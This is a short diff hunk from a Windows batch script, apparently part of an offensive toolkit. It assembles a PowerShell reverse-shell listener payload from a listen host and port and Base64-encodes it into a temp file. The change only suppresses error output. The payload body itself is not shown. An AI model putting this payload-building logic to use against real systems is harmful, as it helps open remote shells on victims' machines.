@@ -422,7 +422,7 @@ set rs_powershell_listener_payload_suf=
 set /p rs_powershell_listener_payload_pre=<%cd%\payload\powershell_listener_1.payload
 set /p rs_powershell_listener_payload_suf=<%cd%\payload\powershell_listener_2.payload
 set powershell_listener_payload=!rs_powershell_listener_payload_pre!!rs_listen_host!'',!rs_listen_port!!rs_powershell_listener_payload_suf!
-powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('!powershell_listener_payload!'))|out-file -Encoding ascii %temp%\powershell_listener.tmp"
+powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('!powershell_listener_payload!'))|out-file -Encoding ascii %temp%\powershell_listener.tmp" 2>nul
 ::echo !powershell_listener_payload!
 ::type %temp%\powershell_listener.tmp
 ::set /p powershell_listener_payload=<%temp%\powershell_listener.tmp
